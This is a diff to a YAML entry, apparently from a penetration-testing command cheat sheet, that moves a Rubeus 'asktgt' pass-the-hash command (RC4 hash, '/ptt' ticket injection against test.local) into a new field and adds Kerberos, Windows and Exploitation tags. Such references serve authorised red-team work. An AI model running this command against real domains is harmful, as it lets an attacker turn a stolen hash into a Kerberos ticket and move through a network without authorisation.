@@ -10,18 +10,15 @@ description: |
 
   	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7
 
+command: |
+  Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 items:
-  Hash:
-    - code: |
-        Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
-  Username:
-    - code: |
-        empty
-filters:
-  Kerberos:
-    - code: |
-        empty
-  Windows:
-    - code: |
-        empty
+  - Hash
+  - Username
+services:
+  - Kerberos
+OS:
+  - Windows
+attack_types:
+  - Exploitation
 ---
